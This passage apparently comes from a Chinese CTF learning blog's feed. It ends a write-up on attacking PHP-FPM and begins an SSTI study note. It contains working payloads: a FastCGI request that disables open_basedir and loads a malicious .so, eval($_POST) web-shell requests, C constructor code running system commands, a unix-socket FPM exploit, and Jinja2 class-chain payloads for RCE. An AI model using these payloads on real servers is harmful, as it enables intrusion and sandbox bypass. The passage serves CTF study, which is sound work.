&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so',
&lt;/code>&lt;/pre>&lt;p>覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode('%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00');var_dump(file_put_contents('ftp://127.0.0.1:46819/wuhu',$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>写恶意.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/code>&lt;/pre>&lt;/div>&lt;p>传.so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>试着执行一下命令，成功解除open_basedir的限制&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊&lt;/p>
&lt;p>正常来说，只有open_basedir被解放后才可以scandir('/')（没有的话是只可以scandir('/var/www/html')），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir('/')都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行&lt;/p>
&lt;p>之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了&lt;/p>
&lt;h4 id="蓝帽杯-2021one-pointer-php">***[蓝帽杯 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysy，确实没时间复现（复现赵总的题让我有心理阴影了）&lt;/p>
&lt;p>我就先云一下，对8起&lt;/p>
&lt;p>参考：&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="攻击unix-socket模式下的php-fpm">攻击unix socket模式下的php-fpm&lt;/h3>
&lt;p>由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是&lt;code>stream_socket_client&lt;/code>建立一个unix socket连接，然后写入tcp流来通信&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">这里是参考wp&lt;/a>&lt;/p>
&lt;p>从phpinfo可以看到disable_functions&lt;/p>
&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>考虑用&lt;code>create_function&lt;/code>来rce，不过还是绕不过disable_functions来执行/readflag&lt;/p>
&lt;p>不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm&lt;/p>
&lt;p>题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动&lt;/p>
&lt;p>fpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个&lt;/p>
&lt;hr>
&lt;p>拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm 与 Nginx优化总结&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP 连接方式 &amp;amp; PHP-FPM未授权访问漏洞 &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;amp;&amp;amp; PHP-FPM未授权访问漏洞 &amp;amp;&amp;amp; Exp编写&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
一点对近况的碎碎念
&lt;/h4>
&lt;/summary>
&lt;p>最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊&lt;/p>
&lt;p>看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样&lt;/p>
&lt;p>这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题&lt;/p>
&lt;p>不过总结是很有必要的，现在的进度是这样：&lt;/p>
&lt;ul>
&lt;li>php反序列化：缺 原生类的学习+跟一些实际的链子&lt;/li>
&lt;li>python反序列化：完&lt;/li>
&lt;li>sqli：差不多完，还得多做点题加深理解&lt;/li>
&lt;li>SSTI：完&lt;/li>
&lt;li>文件上传：之前9月总结到一半去打hvv了&lt;/li>
&lt;li>php-fpm：完&lt;/li>
&lt;li>GraphQL：完&lt;/li>
&lt;/ul>
&lt;p>很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：&lt;/p>
&lt;ul>
&lt;li>ssrf：不熟练&lt;/li>
&lt;li>xss：做题遇到都是躲着走&lt;/li>
&lt;li>js圆形污染：跟上面那个总是一起出现&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>还有java，这个必须得学&lt;/p>
&lt;p>不多说了，冲！！！&lt;/p>
&lt;/details></description></item><item><title>SSTI学习笔记</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分&lt;/p>
&lt;p>Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用&lt;u>过滤器&lt;/u>修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">Hello, {{name|capitalize}}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2也支持控制语句，比如这是一个常见的&lt;u>for语句&lt;/u>的渲染情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% for comment in comments %}
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% endfor %}
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>之所以有模板渲染的漏洞是因为在渲染传递进去的参数时模板可以直接访问Python的一些对象及方法，可以构造一个长长的继承链来执行一些操作，比如文件读写&amp;amp;命令执行&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>：保存类实例或对象实例的属性变量键值对字典&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>：返回一个实例所属的类；python中的新式类（显示继承object对象的类）都有一个属性&lt;code>__class&lt;/code>用于获取当前实例对应的类&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析（即MRO - Method Resolution Order）&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>：以元组形式返回一个类直接所继承的类（可以理解为直接父类）&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>：返回一个类直接所继承的类（单个）（相当于&lt;code>__bases__[0]&lt;/code>），和&lt;code>__mro__&lt;/code>都是用来寻找基类的&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>：以列表形式返回类的所有存活子类的引用（而非实例）；python中的类都继承自object，只要调用object类对象的&lt;code>__subclasses__()&lt;/code>方法就可以获取想要的子类&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>：类的初始化方法&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>：对包含函数全局变量的字典的引用，可以进一步获取file, os等模块&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>：返回不用导入模块可以直接运行一些函数，例如int()，list()等内建函数，查看的方法是&lt;code>dir(__builtins__)&lt;/code>　　
&lt;ul>
&lt;li>在py2中&lt;code>__builtins__&lt;/code>模块是解释器自动创建的对于&lt;code>__builtin__&lt;/code>模块的引用，并非&lt;code>__buitin__&lt;/code>本身（在主模块中时，情况类似我们创建一个变量并对它做一次引用传递，两者是一样的，指向相同；当不是主模块 而是我们创建的一个可以被导入的模块时，&lt;code>__builtins__&lt;/code>其实是对&lt;code>__builtin__.__dict__&lt;/code>模块的引用）&lt;/li>
&lt;li>在py3中&lt;code>__builtin__&lt;/code>被命名为&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="构造的原理">构造的原理&lt;/h2>
&lt;p>一言以蔽之：通过一个长长的调用继承链来将内建的函数或模块揪出来用&lt;/p>
&lt;h3 id="step1---找到基类object">step1 - 找到基类object&lt;/h3>
&lt;p>通过字符串、字典、列表、元组和很特殊的request来获取基类object，mro和bases[0]均可（或者是base 一样的效果，不一一列举）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---获得能用的子类">step2 - 获得“能用的”子类&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>会以列表形式返回object基类下的所有子类，我们需要的是其中含有&lt;code>os&lt;/code>, &lt;code>file&lt;/code>, &lt;code>__builtins__&lt;/code>模块的子类；这里给出一个脚本，可以单独寻找特定子类，也可以根据想要的模块找到对应的子类，返回索引位置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2 &amp;amp; py3&lt;/span>
&lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;warnings.WarningMessage&amp;#34;&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>
&lt;span style="color:#111">raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">raw&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subclass&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[*] &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> - &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">keys&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108115828170.png" alt="image-20211108115828170">到这一步可以得到的&lt;/p>
&lt;p>到这一步，我们的payload已经构造好一半了（以下index均指我们需要的subclass的索引位置）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step3---调用相关函数进行rce">step3 - 调用相关函数进行rce&lt;/h3>
&lt;h4 id="py2---fileoslinecache">py2 - file&amp;amp;os&amp;amp;linecache&lt;/h4>
